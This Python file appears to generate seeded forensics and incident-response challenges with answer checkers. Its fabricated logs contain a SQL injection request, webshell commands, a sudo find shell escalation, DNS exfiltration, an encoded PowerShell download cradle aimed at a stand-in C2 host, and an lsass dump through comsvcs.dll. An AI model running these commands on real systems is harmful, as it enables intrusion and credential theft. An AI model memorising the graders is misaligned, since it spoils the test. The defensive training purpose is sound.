"""Seeded evidence and patch cases for local suite version 4."""

from __future__ import annotations

import base64
import bz2
import codecs
import csv
import gzip
import hashlib
import io
import json
import lzma
import os
import random
import sqlite3
import struct
import tarfile
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path


def put(path: Path, data: bytes | str, mode: int | None = None) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data.encode() if isinstance(data, str) else data)
    if mode is not None:
        path.chmod(mode)


def decoy(seed: int, name: str) -> str:
    return "CG{" + hashlib.sha256(f"decoy:{seed}:{name}".encode()).hexdigest()[:20] + "}"


# ROT13 only rearranges letters, so applying it to compressed bytes destroys the
# magic a solver identifies layers by and leaves an unguessable step. It is
# therefore only ever applied to text: the flag itself, or an encoder's output.
TEXT_LAYERS = ("base64", "base32", "hex")


def layer_order(rng: random.Random) -> list[str]:
    """A seeded layer order in which ROT13 always operates on text."""
    others = ["gzip", "bz2", "base64", "base32", "hex"]
    rng.shuffle(others)
    # Position 0 means ROT13 sees the flag; position i+1 means it sees the output
    # of others[i], so that layer has to be one that emits text.
    positions = [0] + [i + 1 for i, layer in enumerate(others) if layer in TEXT_LAYERS]
    position = rng.choice(positions)
    return others[:position] + ["rot13"] + others[position:]


def apply_layers(data: bytes, order: list[str]) -> bytes:
    for transform in order:
        if transform == "gzip":
            data = gzip.compress(data, mtime=0)
        elif transform == "bz2":
            data = bz2.compress(data)
        elif transform == "base64":
            data = base64.b64encode(data)
        elif transform == "base32":
            data = base64.b32encode(data)
        elif transform == "hex":
            data = data.hex().encode()
        else:
            data = codecs.encode(data.decode("latin1"), "rot_13").encode("latin1")
    return data


def shell(number: int, root: Path, seed: int, flag: str) -> tuple[str, str]:
    """Shell challenges, ordered so SHELL-001 is the easiest and SHELL-005 the hardest."""
    rng = random.Random(f"{seed}:SHELL-{number:03d}")
    if number == 1:
        # Easy: one find with three predicates. The point is the intersection, so
        # files matching only size or only mode are kept NEWER than the target --
        # otherwise "newest file in the tree" would solve it without the filter.
        size = rng.randint(90, 130)
        count, stride = 150, 17
        times = [1700000000 + i * stride for i in range(count)]
        both = [i for i in range(count) if i % 35 == 0]
        # Keep the target out of the newest tail so the decoys there stay newer.
        target = rng.randrange(0, count - 10)
        target_mtime = max(times[i] for i in both) + 50
        for i in range(count):
            path = root / "corpus" / f"batch-{i // 15:02d}" / f"record-{i:03d}.dat"
            matches_size = i == target or i % 5 == 0
            matches_mode = i == target or i % 7 == 0
            content = (flag if i == target else decoy(seed, f"shell1:{i}")).encode()
            put(path, content.ljust(size if matches_size else size + i % 13 + 1, b"."),
                0o640 if matches_mode else 0o644)
            mtime = target_mtime if i == target else times[i]
            os.utime(path, (mtime, mtime))
        goal = (f"In corpus/, find regular files exactly {size} bytes with mode 0640. "
                "Of those, choose the newest by mtime and submit the flag inside it.")
        return goal, "easy"
    if number == 2:
        # Medium: read a format spec and write a parser for it.
        parts = [flag[i:i + 8].encode() for i in range(0, len(flag), 8)]
        records = [(7, i, part) for i, part in enumerate(parts)]
        records += [(3, i, decoy(seed, f"shell2:{i}").encode()) for i in range(8)]
        rng.shuffle(records)
        put(root / "records.bin",
            b"".join(struct.pack("<BHH", typ, seq, len(data)) + data for typ, seq, data in records))
        put(root / "FORMAT.md",
            "Each record is packed without padding: 1-byte unsigned type, 2-byte "
            "little-endian unsigned sequence, 2-byte little-endian unsigned payload "
            "length, then payload bytes. Records follow consecutively until EOF.\n")
        return ("Parse records.bin using FORMAT.md. Concatenate payloads of type 7 in "
                "ascending sequence order and submit the result."), "medium"
    if number == 3:
        # Medium: filter by a time window before aggregating, then join a second file.
        start = datetime(2026, 4, 7, 10, 0, tzinfo=timezone.utc)
        ips = [f"198.51.100.{i}" for i in range(21, 29)]
        # The out-of-window decoy is ips[0], so the answer must never be ips[0] or
        # the trap is inert for that seed.
        winner = rng.choice(ips[1:])
        rows = []
        for _ in range(5200):
            ip = rng.choice(ips)
            moment = start + timedelta(seconds=rng.randrange(-3600, 10800))
            rows.append((moment, ip, rng.choice([200, 200, 200, 404, 503])))
        # In-window burst for the answer, kept clear of the exclusive upper bound.
        rows.extend((start + timedelta(seconds=30 + i), winner, 500) for i in range(1700))
        # Larger burst for ips[0], entirely before the window: whoever greps 5xx
        # without filtering time gets this IP instead.
        rows.extend((start - timedelta(seconds=100 + i), ips[0], 502) for i in range(1900))
        rng.shuffle(rows)
        put(root / "access.log", "\n".join(
            f"{t.isoformat()} {ip} GET /api/{rng.randrange(20)} {status}"
            for t, ip, status in rows) + "\n")
        with (root / "owners.csv").open("w", newline="") as handle:
            writer = csv.writer(handle)
            writer.writerow(["ip", "token"])
            writer.writerows((ip, flag if ip == winner else decoy(seed, f"shell3:{ip}")) for ip in ips)
        return ("Between 2026-04-07T10:00:00+00:00 inclusive and 10:30:00+00:00 exclusive, "
                "which IP has the most 5xx responses in access.log? Submit its token from "
                "owners.csv."), "medium"
    if number == 4:
        # Hard: four archive levels, and a decoy flag beside the real one at every
        # level, so only the manifest digest distinguishes them.
        member = f"records/item-{rng.randrange(1000, 9999)}.txt"
        true_data = (flag + "\n").encode()
        manifest = f"{hashlib.sha256(true_data).hexdigest()}  {member}\n"
        inner = io.BytesIO()
        with tarfile.open(fileobj=inner, mode="w") as tf:
            for name, data in [(member, true_data),
                               ("records/other.txt", (decoy(seed, "shell4-inner") + "\n").encode())]:
                info = tarfile.TarInfo(name); info.size = len(data); tf.addfile(info, io.BytesIO(data))
        inner_xz = lzma.compress(inner.getvalue())
        middle_bz2 = io.BytesIO()
        with tarfile.open(fileobj=middle_bz2, mode="w:bz2") as tf:
            for name, data in [("deep/archive.tar.xz", inner_xz),
                               ("decoy.txt", (decoy(seed, "shell4-bz2") + "\n").encode())]:
                info = tarfile.TarInfo(name); info.size = len(data); tf.addfile(info, io.BytesIO(data))
        middle = io.BytesIO()
        with tarfile.open(fileobj=middle, mode="w:gz") as tf:
            for name, data in [("nested/archive.tar.bz2", middle_bz2.getvalue()),
                               ("decoy.txt", (decoy(seed, "shell4-middle") + "\n").encode())]:
                info = tarfile.TarInfo(name); info.size = len(data); tf.addfile(info, io.BytesIO(data))
        with zipfile.ZipFile(root / "bundle.zip", "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("layer/archive.tar.gz", middle.getvalue())
            zf.writestr("decoy.txt", decoy(seed, "shell4-outer") + "\n")
        put(root / "manifest.sha256", manifest)
        return ("Follow the nested archives in bundle.zip. Submit the flag from the member "
                "whose path and SHA-256 match manifest.sha256."), "hard"
    if number == 5:
        # Hard: six layers whose order is withheld, so each one has to be identified
        # from magic bytes or character set before it can be reversed.
        order = layer_order(rng)
        put(root / "payload.bin", apply_layers(flag.encode(), order))
        put(root / "README.md",
            "payload.bin has six reversible layers: gzip, bzip2, Base64, Base32, hex "
            "and ROT13. Their order is unknown. ROT13 was applied to a text layer, "
            "never to compressed bytes.\n")
        return "Identify and reverse all layers in payload.bin; submit the final flag.", "hard"
    raise ValueError(number)


def forensics(number: int, root: Path, seed: int, flag: str) -> tuple[str, str]:
    rng = random.Random(f"{seed}:FORENSICS-{number:03d}")
    ips = [f"203.0.113.{i}" for i in range(31, 42)]
    if number == 1:
        attacker = rng.choice(ips)
        rows = []
        for ip in ips:
            for n in range(rng.randint(2, 8)):
                rows.append((n, f"2026-04-07T08:{n:02d}:00Z failed src={ip} user=admin"))
        rows.append((20, f"2026-04-07T08:20:00Z accepted src={attacker} user=admin session={flag}"))
        rows.append((21, f"2026-04-07T08:21:00Z accepted src=192.0.2.10 user=admin session={decoy(seed, 'for1')}"))
        rng.shuffle(rows)
        put(root / "auth.log", "\n".join(row for _, row in rows) + "\n")
        return "Find the admin session accepted from a source that previously failed authentication; submit that session.", "medium"
    if number == 2:
        domain = "transfer.example.invalid"
        encoded = base64.b32encode(flag.encode()).decode().rstrip("=").lower()
        chunks = [encoded[i:i + 10] for i in range(0, len(encoded), 10)]
        rows = [f"2026-04-07T10:{i:02d}:00Z {i:02d}-{chunk}.{domain} A" for i, chunk in enumerate(chunks)]
        rows += [f"2026-04-07T11:{i:02d}:00Z {i:02d}-{decoy(seed, f'for2:{i}')[3:12]}.metrics.example.invalid A" for i in range(15)]
        rng.shuffle(rows)
        put(root / "dns.log", "\n".join(rows) + "\n")
        return f"In dns.log, reconstruct the Base32 message sent through {domain}. Order chunks by the number in each label and submit the decoded flag.", "medium"
    if number == 3:
        payload = io.BytesIO()
        with zipfile.ZipFile(payload, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("evidence/answer.txt", flag + "\n")
            zf.writestr("evidence/old.txt", decoy(seed, "for3") + "\n")
        put(root / "disk.img", rng.randbytes(rng.randint(1024, 4096)) + payload.getvalue() + rng.randbytes(1024))
        put(root / "README.md", "A ZIP archive was appended inside this image. The current answer is in evidence/answer.txt.\n")
        return "Carve the embedded ZIP from disk.img and submit the current answer in evidence/answer.txt.", "hard"
    if number == 4:
        attacker = rng.choice(ips)
        base = datetime(2026, 4, 7, 12, 0, tzinfo=timezone.utc)
        attack_pid = rng.randint(3000, 9000)
        put(root / "auth.log", f"Apr  7 12:00:00 host sshd: Failed password from {attacker}\nApr  7 12:01:00 host sshd: Accepted password from {attacker} session=A1\nApr  7 12:02:00 host sshd: Accepted password from 192.0.2.10 session=B2\n")
        web_rows = [{"time": (base + timedelta(seconds=i)).isoformat(), "event": "request", "ip": rng.choice(ips)} for i in range(90)]
        web_rows.append({"time": (base + timedelta(seconds=68)).isoformat(), "event": "session_process", "session": "A1", "pid": attack_pid})
        rng.shuffle(web_rows)
        put(root / "web.jsonl", "\n".join(map(json.dumps, web_rows)) + "\n")
        events = [({"epoch": int((base + timedelta(seconds=75)).timestamp()), "pid": attack_pid, "event": "spawn", "token": flag}),
                  ({"epoch": int((base + timedelta(seconds=76)).timestamp()), "pid": attack_pid + 1, "event": "spawn", "token": decoy(seed, "for4")})]
        rng.shuffle(events)
        put(root / "process.jsonl", "\n".join(map(json.dumps, events)) + "\n")
        put(root / "README.md", "The syslog dates use UTC in 2026. Correlate auth.log, web.jsonl (ISO-8601), and process.jsonl (epoch seconds).\n")
        return "Find the first successful login by an IP that previously failed. Correlate its session in web.jsonl with a process spawned within 60 seconds; submit that process's token.", "hard"
    if number == 5:
        db = sqlite3.connect(root / "audit.db")
        db.executescript("CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, api_key TEXT); CREATE TABLE promotions(user_id INTEGER, at TEXT); CREATE TABLE tickets(user_id INTEGER, approved INTEGER);")
        for i in range(1, 13):
            db.execute("INSERT INTO users VALUES(?,?,?)", (i, f"user{i}", flag if i == 7 else decoy(seed, f"for5:{i}")))
            db.execute("INSERT INTO promotions VALUES(?,?)", (i, "2026-04-07 02:10:00" if i in (3, 7) else "2026-04-07 13:00:00"))
            if i != 7: db.execute("INSERT INTO tickets VALUES(?,1)", (i,))
        db.commit(); db.close()
        put(root / "README.md", "Business hours are 09:00–17:00 UTC. A matching approved ticket uses the same user_id.\n")
        return "In audit.db, find the user promoted outside business hours without a matching approved ticket; submit their api_key.", "hard"
    raise ValueError(number)


def intrusion_case(root: Path, seed: int):
    """Build a two-host incident and return its goal and weighted answer checker."""
    rng = random.Random(f"{seed}:CASE-002")
    attacker = f"203.0.113.{rng.randint(40, 220)}"
    account = rng.choice(["deploy", "backup", "svc-web"])
    destination = f"198.51.100.{rng.randint(40, 220)}"
    file_path = "/srv/finance/customers.csv"
    put(root / "README.md", "CASE-002 — Two-host intrusion\nInvestigate host1 and host2 evidence. All timestamps are UTC on 2026-04-07. Submit one JSON object with attacker_ip, initial_access, webshell, privilege_escalation, lateral_account, exfiltration, sensitive_file, timeline, and remediation.\n")
    put(root / "host1" / "web.log", "\n".join([
        f'10:00:01 192.0.2.10 GET /products?id=1 200',
        f'10:02:11 {attacker} GET /products?id=1%20UNION%20SELECT%20password%20FROM%20users 200',
        f'10:03:02 {attacker} POST /uploads/shell.php 201',
        f'10:03:12 {attacker} GET /uploads/shell.php?cmd=id 200',
        f'10:12:00 192.0.2.10 GET /health 200',
    ]) + "\n")
    put(root / "host1" / "process.log", "\n".join([
        "10:03:12 www-data pid=2231 php /var/www/uploads/shell.php cmd=id",
        "10:04:20 www-data pid=2238 php /var/www/uploads/shell.php cmd=sudo -l",
        "10:04:29 root pid=2241 sudo /usr/bin/find . -exec /bin/sh ;",
        f"10:05:02 root pid=2249 ssh {account}@host2",
        "10:12:00 root pid=2290 /usr/bin/healthcheck",
    ]) + "\n")
    put(root / "host1" / "sudoers.txt", "www-data ALL=(root) NOPASSWD: /usr/bin/find\n")
    put(root / "host2" / "auth.log", "\n".join([
        f"10:05:03 Accepted publickey for {account} from host1",
        "10:10:00 Accepted publickey for alice from 192.0.2.10",
    ]) + "\n")
    put(root / "host2" / "dns.log", "\n".join([
        f"10:06:01 {account} query 00-{base64.b32encode(file_path.encode()).decode().rstrip('=').lower()}.upload.{destination.replace('.', '-')}.invalid",
        f"10:06:02 {account} query 01-records.upload.{destination.replace('.', '-')}.invalid",
        "10:11:00 alice query updates.example.invalid",
    ]) + "\n")
    put(root / "host2" / "file_access.log", f"10:05:44 {account} read {file_path}\n10:11:00 alice read /var/log/health.log\n")

    def checker(answer: str):
        import re
        try:
            value = json.loads(answer)
        except json.JSONDecodeError:
            match = re.search(r"\{.*\}", answer, re.S)
            try: value = json.loads(match.group(0)) if match else {}
            except json.JSONDecodeError: value = {}
        if not isinstance(value, dict): value = {}
        lower = json.dumps(value, sort_keys=True).lower()
        dimensions = {
            "attacker_ip": str(value.get("attacker_ip", "")) == attacker,
            "initial_access": "sqli" in lower or ("sql" in lower and "injection" in lower),
            "webshell": "shell.php" in lower,
            "privilege_escalation": "sudo" in lower and "find" in lower,
            "lateral_account": str(value.get("lateral_account", "")).lower() == account,
            "exfiltration": "dns" in lower and ("exfil" in lower or "upload" in lower),
            "sensitive_file": file_path in lower,
            "timeline": sum(x in lower for x in ("10:02", "10:03", "10:04", "10:05", "10:06")) >= 3,
            "remediation": sum(x in lower for x in ("patch", "remove", "rotate", "revoke", "block", "isolate")) >= 3,
        }
        weights = {"attacker_ip": 1, "initial_access": 1, "webshell": 1,
                   "privilege_escalation": 2, "lateral_account": 1, "exfiltration": 1,
                   "sensitive_file": 1, "timeline": 1, "remediation": 1}
        score = sum(weights[key] for key, passed in dimensions.items() if passed)
        return score >= 8, {"score": score, "max_score": 10, "dimensions": dimensions}

    goal = "Investigate the two-host incident. Submit a JSON object with attacker_ip, initial_access, webshell, privilege_escalation, lateral_account, exfiltration, sensitive_file, timeline, and remediation."
    return goal, checker


def phishing_case(root: Path, seed: int):
    """Build a phished-workstation incident (CASE-003) and return its goal and weighted checker.

    The C2 domain never appears in clear next to the beacons: it is only in the encoded
    PowerShell command and in DNS, so the agent must decode or correlate. Decoys: a
    quarantined phishing mail to another user and an hourly updater in the proxy log.
    """
    rng = random.Random(f"{seed}:CASE-003")
    users = ["mlopez", "jchen", "apatel", "rkim", "tnguyen"]
    victim = rng.choice(users)
    decoy_user = rng.choice([user for user in users if user != victim])
    attachment = f"invoice_{rng.randint(1000, 9999)}.docm"
    decoy_attachment = f"payment_{rng.randint(1000, 9999)}.docm"
    c2_domain = f"{rng.choice(['cdn-telemetry', 'sync-metrics', 'edge-stat'])}{rng.randint(10, 99)}.example.invalid"
    c2_ip = f"203.0.113.{rng.randint(20, 230)}"
    updater_ip = f"198.51.100.{rng.randint(20, 230)}"
    interval = rng.choice([120, 180, 240, 300])
    account = rng.choice(["svc-backup", "svc-sql", "svc-deploy"])
    archive = f"stage{rng.randint(10, 99)}.7z"
    upload_host = f"files-{rng.randint(10, 99)}.example.invalid"
    command = f"IEX (New-Object Net.WebClient).DownloadString('http://{c2_domain}/a')"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode()

    put(root / "README.md", "CASE-003 — Phished workstation\nInvestigate mail/, ws17/ and fs02/. All timestamps are UTC on "
        "2026-05-12. Submit one JSON object with victim_user, phishing_attachment, c2_domain, "
        "beacon_interval_seconds, credential_access, lateral_account, staged_archive, timeline, and remediation.\n"
        "Do not invent facts that the evidence does not support.\n")
    put(root / "mail" / "gateway.log", "\n".join([
        f"09:02:11 DELIVER from=billing@supplier.example.invalid to={decoy_user}@corp.example.invalid attachment=statement.pdf verdict=clean",
        f"09:09:40 QUARANTINE from=accounts@paymnt-notice.invalid to={decoy_user}@corp.example.invalid attachment={decoy_attachment} verdict=malicious",
        f"09:14:05 DELIVER from=ap@supp1ier.example.invalid to={victim}@corp.example.invalid attachment={attachment} verdict=clean",
        "09:30:00 DELIVER from=news@intranet.example.invalid to=all@corp.example.invalid attachment=none verdict=clean",
    ]) + "\n")
    put(root / "ws17" / "process.log", "\n".join([
        "09:00:03 user=SYSTEM pid=704 lsass.exe",
        f"09:05:12 user={victim} pid=3980 chrome.exe",
        f'09:21:07 user={victim} pid=4410 WINWORD.EXE "C:\\Users\\{victim}\\Downloads\\{attachment}"',
        f"09:21:12 user={victim} pid=4432 parent=4410 powershell.exe -nop -w hidden -enc {encoded}",
        f"09:40:55 user={victim} pid=4710 Teams.exe",
        f"10:05:41 user={victim} pid=5120 parent=4432 rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\ProgramData\\l.dmp full",
        f"10:09:58 user={victim} pid=5188 parent=4432 net.exe use \\\\FS-02\\Finance /user:CORP\\{account}",
    ]) + "\n")
    proxy = []
    for index in range(int(80 * 60 / interval)):
        moment = datetime(2026, 5, 12, 9, 22, tzinfo=timezone.utc) + timedelta(seconds=index * interval)
        proxy.append((moment, f"{moment:%H:%M:%S} WS-17 CONNECT {c2_ip}:443 bytes=412"))
    for hour in (9, 10):
        moment = datetime(2026, 5, 12, hour, 0, 30, tzinfo=timezone.utc)
        proxy.append((moment, f"{moment:%H:%M:%S} WS-17 GET http://updates.example.invalid/check ({updater_ip}) bytes=2048"))
    sites = ["docs.example.invalid", "wiki.example.invalid", "news.example.invalid", "cdn.example.invalid"]
    for index in range(320):
        moment = datetime(2026, 5, 12, 9, 0, tzinfo=timezone.utc) + timedelta(seconds=rng.randrange(0, 6000))
        proxy.append((moment, f"{moment:%H:%M:%S} WS-17 GET https://{rng.choice(sites)}/p/{index} bytes={rng.randrange(800, 90000)}"))
    put(root / "ws17" / "proxy.log", "\n".join(line for _, line in sorted(proxy)) + "\n")
    put(root / "ws17" / "dns.log", "\n".join([
        "09:00:29 WS-17 query updates.example.invalid A " + updater_ip,
        f"09:05:13 WS-17 query docs.example.invalid A 192.0.2.{rng.randint(20, 230)}",
        f"09:21:13 WS-17 query {c2_domain} A {c2_ip}",
        f"09:40:56 WS-17 query teams.example.invalid A 192.0.2.{rng.randint(20, 230)}",
    ]) + "\n")
    put(root / "fs02" / "security.log", "\n".join([
        "02:00:04 EventID=4624 LogonType=3 Account=svc-monitor Source=10.0.0.5",
        f"10:11:02 EventID=4624 LogonType=3 Account={account} Source=WS-17",
        "11:30:10 EventID=4624 LogonType=3 Account=svc-monitor Source=10.0.0.5",
    ]) + "\n")
    put(root / "fs02" / "file_audit.log", "\n".join(
        [f"10:{13 + index}:0{index} {account} read \\\\FS-02\\Finance\\{name}"
         for index, name in enumerate(["payroll-2026.xlsx", "vendors.xlsx", "q1-forecast.xlsx", "bank-details.xlsx"])]
        + [f"10:20:44 {account} create C:\\ProgramData\\Packages\\{archive}",
           "11:30:12 svc-monitor read \\\\FS-02\\Health\\status.txt"]) + "\n")
    put(root / "fs02" / "net.log", f"10:26:30 {account} POST https://{upload_host}/upload file={archive} bytes=48211337\n"
        "11:30:15 svc-monitor GET https://monitor.example.invalid/ping bytes=120\n")

    def checker(answer: str):
        import re
        try:
            value = json.loads(answer)
        except json.JSONDecodeError:
            match = re.search(r"\{.*\}", answer, re.S)
            try: value = json.loads(match.group(0)) if match else {}
            except json.JSONDecodeError: value = {}
        if not isinstance(value, dict): value = {}
        lower = json.dumps(value, sort_keys=True).lower()

        def seconds_value(raw) -> float | None:
            if isinstance(raw, (int, float)) and not isinstance(raw, bool):
                return float(raw)
            found = re.search(r"\d+(?:\.\d+)?", str(raw or ""))
            if not found:
                return None
            number = float(found.group(0))
            return number * 60 if "min" in str(raw).lower() else number

        user = str(value.get("victim_user", "")).lower().split("\\")[-1].split("@")[0].strip()
        sent = str(value.get("phishing_attachment", "")).lower()
        beacon = seconds_value(value.get("beacon_interval_seconds"))
        dimensions = {
            "victim_user": user == victim,
            "phishing_attachment": attachment in sent and decoy_attachment not in sent,
            "c2_domain": c2_domain in str(value.get("c2_domain", "")).lower(),
            "beacon_interval": beacon is not None and abs(beacon - interval) <= 5,
            "credential_access": "lsass" in lower and any(x in lower for x in ("dump", "minidump", "comsvcs")),
            "lateral_account": str(value.get("lateral_account", "")).lower().split("\\")[-1] == account,
            "staged_archive": archive in str(value.get("staged_archive", "")).lower(),
            "timeline": sum(x in lower for x in ("09:14", "09:21", "09:22", "10:05", "10:11", "10:20", "10:26")) >= 4,
            "remediation": sum(x in lower for x in ("isolate", "reset", "rotate", "block", "remove", "revoke",
                                                   "reimage", "quarantine", "disable")) >= 3,
        }
        weights = {"victim_user": 1, "phishing_attachment": 1, "c2_domain": 2, "beacon_interval": 1,
                   "credential_access": 1, "lateral_account": 1, "staged_archive": 1, "timeline": 1,
                   "remediation": 1}
        score = sum(weights[key] for key, passed in dimensions.items() if passed)
        return score >= 8, {"score": score, "max_score": 10, "dimensions": dimensions}

    goal = ("Investigate the phished-workstation incident across mail/, ws17/ and fs02/. Submit a JSON object with "
            "victim_user, phishing_attachment, c2_domain, beacon_interval_seconds, credential_access, "
            "lateral_account, staged_archive, timeline, and remediation.")
    return goal, checker
